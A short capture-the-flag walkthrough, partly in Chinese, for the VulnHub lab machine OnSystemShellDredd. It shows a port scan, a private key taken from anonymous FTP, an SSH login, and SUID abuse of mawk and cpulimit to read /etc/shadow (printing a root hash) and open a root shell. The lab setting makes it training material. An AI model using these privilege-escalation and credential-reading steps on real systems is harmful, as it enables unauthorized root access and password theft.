# OnSystemShellDredd

2024-5-28 https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/

difficulty: easy

## IP

192.168.237.130

## Scan

Open Port -> 21,61000

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 592d210c2faf9d5a7b3ea427aa378908 (RSA)
|   256 5926da443b97d230b19b9b02748b8758 (ECDSA)
|_  256 8ead104fe33e652840cb5bbf1d247f17 (ED25519)
```

21 ftp 允许匿名登陆，看看有什么信息。登陆后，在 .hannah 隐藏目录中发现 id_rsa，mget 下载到 kali 上。chmod 600

ssh 登陆不知道用户名，看到那个 .hannah 的文件夹，猜测用户名可能是 hannah，尝试登陆：

```
ssh -i id_rsa hannah@192.168.237.130 -p 61000
```

登陆成功,发现 flag：

```
hannah@ShellDredd:~$ cat local.txt
2375cc1f117fb9ffbcbf6d4911fd9dbc
```

sudo、crontab 都没发现特殊设置。

发现 suid 程序：

```
find / -perm -u=s -ls 2>/dev/null

/usr/bin/mawk
/usr/bin/cpulimit
```

进行利用：

```
mawk '//' "/root/proof.txt"

b305169c37ca8ff9bb0f073e26d53390
```

```
mawk '//' "/etc/shadow"

root:$6$pUGgTFAG7pM5Sy5M$SXmRNf2GSZhId7mGCsFwJ4UCweCXGKSMIO8/qDM6NsiKckV8UZeZefDYw2CL2uAEwawIufKMv/e1Q6YDyTeqp0:18656:0:99999:7:::
```

```
hannah@ShellDredd:/var/spool/cron$ cpulimit -l 100 -f -- /bin/sh -p
Process 1288 detected
# id
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)
# cd /root
# ls
proof.txt  root.txt
```
